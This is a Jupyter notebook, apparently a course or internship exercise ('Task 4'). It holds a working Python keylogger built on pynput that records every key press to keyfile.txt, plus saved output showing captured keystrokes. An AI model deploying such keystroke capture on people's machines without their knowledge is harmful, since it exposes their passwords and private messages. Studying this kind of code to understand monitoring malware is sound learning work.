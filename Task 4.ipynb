{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "1a18078d-0775-4c0a-b868-c4df0ef6396d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'c'\n",
      "'-'\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "'s'\n",
      "'t'\n",
      "'o'\n",
      "'p'\n"
     ]
    },
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      " stop\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.enter\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n",
      "Key.backspace\n",
      "Error getting char\n"
     ]
    }
   ],
   "source": [
    "\n",
    "from pynput import keyboard\n",
    "\n",
    "def keyPressed(key):\n",
    "    print(str(key))\n",
    "    with open(\"keyfile.txt\", 'a') as logKey:\n",
    "        try:\n",
    "            char = key.char\n",
    "            logKey.write(char)\n",
    "        except:\n",
    "           \n",
    "            print(\"Error getting char\")    \n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    listener = keyboard.Listener(on_press= keyPressed)\n",
    "    \n",
    "    listener.start()\n",
    "   \n",
    "    input()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe1d7261-d4ba-42f2-b8ee-df0ec7dc5179",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
